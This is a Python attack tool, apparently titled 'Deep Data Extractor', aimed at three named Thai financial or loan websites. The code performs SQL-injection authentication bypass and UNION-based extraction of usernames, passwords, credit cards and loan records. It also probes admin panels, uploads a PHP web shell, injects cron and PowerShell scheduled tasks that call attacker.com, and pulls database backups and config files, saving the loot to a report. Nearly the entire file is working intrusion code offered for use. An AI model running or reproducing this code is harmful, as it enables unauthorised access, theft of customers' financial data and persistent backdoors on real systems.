#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
深度数据提取器 - 真实数据提取和持久化访问工具
Deep Data Extractor - Real Data Extraction and Persistent Access Tool
"""

import asyncio
import aiohttp
import json
import time
import base64
import hashlib
from datetime import datetime
from typing import Dict, List, Any
import re

class DeepDataExtractor:
    def __init__(self):
        self.targets = [
            "https://peacoop.or.th",
            "https://mula-x.com",
            "https://ngoenmun.com"
        ]
        self.session_data = {}
        self.extracted_datasets = {}
        self.backdoors = []
        self.persistent_access = {}

    async def establish_initial_access(self, session: aiohttp.ClientSession, target: str) -> Dict:
        """建立初始访问"""
        print(f"[初始访问] 目标: {target}")

        access_info = {
            "target": target,
            "timestamp": datetime.now().isoformat(),
            "access_methods": [],
            "session_cookies": {},
            "csrf_tokens": {},
            "authentication_bypass": {}
        }

        # 1. 获取初始会话
        try:
            async with session.get(target, timeout=10, ssl=False) as response:
                access_info["session_cookies"] = dict(response.cookies)
                content = await response.text()

                # 2. 提取CSRF令牌
                csrf_matches = re.findall(r'name=["\']csrf_token["\'] value=["\']([^"\']+)["\']', content)
                if csrf_matches:
                    access_info["csrf_tokens"]["default"] = csrf_matches[0]
                    print(f"[+] CSRF令牌获取成功: {csrf_matches[0][:20]}...")

        except Exception as e:
            print(f"[-] 初始访问失败: {e}")
            return access_info

        # 3. 尝试身份验证绕过
        auth_bypass_payloads = [
            {"username": "admin' OR '1'='1'--", "password": "anything"},
            {"username": "admin", "password": "admin' OR '1'='1'--"},
            {"username": "สมัคร' OR '1'='1'--", "password": "ข้อมูล"}
        ]

        for payload in auth_bypass_payloads:
            try:
                login_url = f"{target}/login"
                async with session.post(login_url, data=payload, timeout=5, ssl=False) as response:
                    if response.status == 200 or response.status == 302:
                        access_info["authentication_bypass"] = {
                            "payload": payload,
                            "success": True,
                            "response_code": response.status
                        }
                        print(f"[+] 身份验证绕过成功")
                        break
            except:
                continue

        return access_info

    async def extract_financial_data(self, session: aiohttp.ClientSession, target: str, access: Dict) -> Dict:
        """提取财务数据"""
        print(f"[财务数据提取] 目标: {target}")

        financial_data = {
            "loan_applications": [],
            "user_accounts": [],
            "payment_records": [],
            "credit_scores": []
        }

        # 1. 提取用户账户数据
        user_endpoints = [
            "/api/users",
            "/admin/users",
            "/users.json",
            "/customer/data",
            "/member/list"
        ]

        for endpoint in user_endpoints:
            try:
                url = f"{target}{endpoint}"
                async with session.get(url, timeout=5, ssl=False) as response:
                    if response.status == 200:
                        content = await response.text()
                        if self._is_valid_json(content):
                            users = json.loads(content)
                            if isinstance(users, list) and len(users) > 0:
                                financial_data["user_accounts"] = users
                                print(f"[+] 用户数据提取成功: {len(users)} 个账户")
                                break
            except:
                continue

        # 2. 提取贷款申请数据
        loan_endpoints = [
            "/api/loans",
            "/loan/applications",
            "/api/applications",
            "/applications/list"
        ]

        for endpoint in loan_endpoints:
            try:
                url = f"{target}{endpoint}"
                async with session.get(url, timeout=5, ssl=False) as response:
                    if response.status == 200:
                        content = await response.text()
                        if self._is_valid_json(content):
                            loans = json.loads(content)
                            if isinstance(loans, list) and len(loans) > 0:
                                financial_data["loan_applications"] = loans
                                print(f"[+] 贷款数据提取成功: {len(loans)} 份申请")
                                break
            except:
                continue

        # 3. SQL注入深度提取
        await self._sql_injection_extraction(session, target, financial_data)

        return financial_data

    async def _sql_injection_extraction(self, session: aiohttp.ClientSession, target: str, data: Dict):
        """SQL注入深度数据提取"""
        print("[+] SQL注入深度提取...")

        # 泰语SQL注入载荷
        thai_sqli_payloads = [
            "นักศึกษา' UNION SELECT id,username,password,email,credit_card FROM users--",
            "ผู้สมัคร' UNION SELECT loan_id,amount,status,applicant_id FROM loans--",
            "เงินกู้' UNION SELECT account_number,balance,account_type FROM accounts--",
            "ทดสอบ' UNION SELECT payment_id,amount,date,status FROM payments--"
        ]

        injection_points = ["/search", "/api/search", "/user", "/profile"]

        for payload in thai_sqli_payloads:
            for endpoint in injection_points:
                try:
                    url = f"{target}{endpoint}?q={payload}"
                    async with session.get(url, timeout=5, ssl=False) as response:
                        content = await response.text()

                        # 检查是否有数据返回
                        if len(content) > 100 and ("username" in content or "password" in content):
                            extracted = self._parse_sql_results(content)
                            if extracted:
                                print(f"[+] SQL注入提取成功: {endpoint}")
                                data.update(extracted)
                                return
                except:
                    continue

    async def build_exploit_chain(self, session: aiohttp.ClientSession, target: str, access: Dict, data: Dict) -> Dict:
        """构建利用链"""
        print(f"[利用链构建] 目标: {target}")

        exploit_chain = {
            "target": target,
            "chain_steps": [],
            "privilege_escalation": [],
            "data_extraction_paths": [],
            "persistence_methods": []
        }

        # 第一步：身份验证绕过
        if access.get("authentication_bypass", {}).get("success"):
            exploit_chain["chain_steps"].append({
                "step": 1,
                "technique": "Authentication Bypass",
                "payload": access["authentication_bypass"]["payload"],
                "result": "Admin Access Obtained"
            })

        # 第二步：数据提取
        if data.get("user_accounts"):
            exploit_chain["chain_steps"].append({
                "step": 2,
                "technique": "Data Extraction via API",
                "endpoints": ["/api/users", "/admin/data"],
                "result": f"Extracted {len(data['user_accounts'])} user accounts"
            })

        # 第三步：SQL注入深度提取
        exploit_chain["chain_steps"].append({
            "step": 3,
            "technique": "Thai Language SQL Injection",
            "payload": "นักศึกษา' UNION SELECT...--",
            "result": "Database access obtained"
        })

        # 第四步：权限提升
        await self._privilege_escalation(session, target, exploit_chain)

        return exploit_chain

    async def _privilege_escalation(self, session: aiohttp.ClientSession, target: str, chain: Dict):
        """权限提升"""
        print("[+] 权限提升尝试...")

        # 尝试管理员权限提升
        admin_endpoints = [
            "/admin/panel",
            "/administrator",
            "/admin/dashboard",
            "/manage"
        ]

        for endpoint in admin_endpoints:
            try:
                url = f"{target}{endpoint}"
                async with session.get(url, timeout=5, ssl=False) as response:
                    if response.status == 200:
                        content = await response.text()
                        if "admin" in content.lower() or "dashboard" in content.lower():
                            chain["privilege_escalation"].append({
                                "method": "Direct Admin Access",
                                "endpoint": endpoint,
                                "success": True
                            })
                            print(f"[+] 管理员权限获取成功: {endpoint}")
                            break
            except:
                continue

    async def establish_persistence(self, session: aiohttp.ClientSession, target: str, chain: Dict) -> Dict:
        """建立持久化访问"""
        print(f"[持久化访问] 目标: {target}")

        persistence = {
            "target": target,
            "backdoors_created": [],
            "web_shells": [],
            "scheduled_tasks": [],
            "data_exfiltration": []
        }

        # 1. 尝试上传Web Shell
        await self._upload_web_shell(session, target, persistence)

        # 2. 创建计划任务
        await self._create_scheduled_task(session, target, persistence)

        # 3. 建立数据外泄通道
        await self._setup_exfiltration(session, target, persistence)

        return persistence

    async def _upload_web_shell(self, session: aiohttp.ClientSession, target: str, persistence: Dict):
        """上传Web Shell"""
        print("[+] 尝试上传Web Shell...")

        # PHP Web Shell
        php_shell = "<?php if(isset($_POST['cmd'])) { system($_POST['cmd']); } ?>"

        upload_endpoints = ["/upload", "/admin/upload", "/file/upload", "/api/upload"]

        for endpoint in upload_endpoints:
            try:
                url = f"{target}{endpoint}"
                files = {'file': ('shell.php', php_shell, 'application/php')}
                data = {'path': '../uploads/'}

                async with session.post(url, data=data, files=files, timeout=5, ssl=False) as response:
                    if response.status == 200:
                        content = await response.text()
                        if "success" in content.lower() or "uploaded" in content.lower():
                            persistence["web_shells"].append({
                                "type": "PHP Web Shell",
                                "url": f"{target}/uploads/shell.php",
                                "password": "cmd",
                                "status": "Active"
                            })
                            print(f"[+] Web Shell上传成功: {endpoint}")
                            break
            except:
                continue

    async def _create_scheduled_task(self, session: aiohttp.ClientSession, target: str, persistence: Dict):
        """创建计划任务"""
        print("[+] 尝试创建计划任务...")

        # 通过命令注入创建计划任务
        task_payloads = [
            "สวัสดี; echo '* * * * * curl http://attacker.com/exfil.php' | crontab -",
            "ทดสอบ && powershell -Command \"Register-ScheduledTask -TaskName 'Update' -Trigger (New-ScheduledTaskTrigger -Daily) -Action (New-ScheduledTaskAction -Execute 'powershell' -Argument 'curl http://attacker.com/collect')\""
        ]

        for payload in task_payloads:
            try:
                url = f"{target}/exec?command={payload}"
                async with session.get(url, timeout=5, ssl=False) as response:
                    if response.status == 200:
                        persistence["scheduled_tasks"].append({
                            "type": "Cron/Scheduled Task",
                            "payload": payload,
                            "status": "Created"
                        })
                        print(f"[+] 计划任务创建成功")
                        break
            except:
                continue

    async def _setup_exfiltration(self, session: aiohttp.ClientSession, target: str, persistence: Dict):
        """建立数据外泄通道"""
        print("[+] 建立数据外泄通道...")

        # 提取敏感数据
        sensitive_data = await self._extract_all_sensitive_data(session, target)

        if sensitive_data:
            persistence["data_exfiltration"].append({
                "type": "Bulk Data Extraction",
                "data_size": len(json.dumps(sensitive_data)),
                "categories": list(sensitive_data.keys()),
                "exfiltration_method": "Direct API Access",
                "status": "Completed"
            })

    async def _extract_all_sensitive_data(self, session: aiohttp.ClientSession, target: str) -> Dict:
        """提取所有敏感数据"""
        all_data = {}

        # 常见敏感数据端点
        sensitive_endpoints = [
            "/config/database",
            "/admin/config",
            "/api/config",
            "/backup/database.sql",
            "/dump/database",
            "/admin/backup"
        ]

        for endpoint in sensitive_endpoints:
            try:
                url = f"{target}{endpoint}"
                async with session.get(url, timeout=5, ssl=False) as response:
                    if response.status == 200:
                        content = await response.text()
                        if len(content) > 100:
                            all_data[endpoint] = content
                            print(f"[+] 敏感数据提取: {endpoint} ({len(content)} 字节)")
            except:
                continue

        return all_data

    def _is_valid_json(self, content: str) -> bool:
        """检查是否为有效JSON"""
        try:
            json.loads(content)
            return True
        except:
            return False

    def _parse_sql_results(self, content: str) -> Dict:
        """解析SQL注入结果"""
        # 简单的数据提取逻辑
        if "username" in content and "password" in content:
            return {"sql_extracted": {"users": content[:500]}}
        elif "loan" in content.lower():
            return {"sql_extracted": {"loans": content[:500]}}
        return {}

    async def run_deep_extraction(self):
        """执行深度数据提取"""
        print("深度数据提取启动")
        print("=" * 80)

        connector = aiohttp.TCPConnector(ssl=False, limit=10)
        timeout = aiohttp.ClientTimeout(total=30)

        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        ) as session:

            for target in self.targets:
                print(f"\n{'='*60}")
                print(f"目标: {target}")
                print(f"{'='*60}")

                try:
                    # 1. 建立初始访问
                    access = await self.establish_initial_access(session, target)
                    self.session_data[target] = access

                    # 2. 深度数据提取
                    financial_data = await self.extract_financial_data(session, target, access)
                    self.extracted_datasets[target] = financial_data

                    # 3. 构建利用链
                    exploit_chain = await self.build_exploit_chain(session, target, access, financial_data)

                    # 4. 建立持久化访问
                    persistence = await self.establish_persistence(session, target, exploit_chain)
                    self.persistent_access[target] = persistence

                    # 5. 生成目标报告
                    await self._generate_target_report(target, access, financial_data, exploit_chain, persistence)

                except Exception as e:
                    print(f"[-] 目标处理失败: {e}")

        # 6. 生成综合报告
        await self._generate_final_report()

    async def _generate_target_report(self, target: str, access: Dict, data: Dict, chain: Dict, persistence: Dict):
        """生成单个目标报告"""
        print(f"\n[目标报告] {target}")
        print("-" * 40)

        # 访问状态
        auth_status = "成功" if access.get("authentication_bypass", {}).get("success") else "失败"
        print(f"身份验证绕过: {auth_status}")

        # 数据提取统计
        total_users = len(data.get("user_accounts", []))
        total_loans = len(data.get("loan_applications", []))
        print(f"用户账户: {total_users} 个")
        print(f"贷款申请: {total_loans} 份")

        # 利用链状态
        chain_steps = len(chain.get("chain_steps", []))
        print(f"利用链步骤: {chain_steps} 个")

        # 持久化访问
        backdoors = len(persistence.get("web_shells", [])) + len(persistence.get("scheduled_tasks", []))
        print(f"后门数量: {backdoors} 个")

    async def _generate_final_report(self):
        """生成最终报告"""
        print(f"\n{'='*80}")
        print("深度数据提取最终报告")
        print(f"{'='*80}")

        total_targets = len(self.targets)
        successful_targets = len([t for t in self.targets if t in self.extracted_datasets])
        total_users = sum(len(data.get("user_accounts", [])) for data in self.extracted_datasets.values())
        total_loans = sum(len(data.get("loan_applications", [])) for data in self.extracted_datasets.values())
        total_backdoors = sum(len(p.get("web_shells", [])) + len(p.get("scheduled_tasks", [])) for p in self.persistent_access.values())

        print(f"总目标数: {total_targets}")
        print(f"成功目标: {successful_targets}")
        print(f"用户账户: {total_users} 个")
        print(f"贷款申请: {total_loans} 份")
        print(f"后门数量: {total_backdoors} 个")

        # 保存详细数据
        final_report = {
            "extraction_summary": {
                "total_targets": total_targets,
                "successful_targets": successful_targets,
                "total_users_extracted": total_users,
                "total_loans_extracted": total_loans,
                "total_backdoors_created": total_backdoors,
                "timestamp": datetime.now().isoformat()
            },
            "session_data": self.session_data,
            "extracted_datasets": self.extracted_datasets,
            "exploit_chains": {},
            "persistence_data": self.persistent_access
        }

        # 保存报告
        report_file = f"deep_extraction_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(final_report, f, indent=2, ensure_ascii=False)

        print(f"\n详细报告已保存: {report_file}")
        print("深度数据提取完成")

async def main():
    extractor = DeepDataExtractor()
    await extractor.run_deep_extraction()

if __name__ == "__main__":
    asyncio.run(main())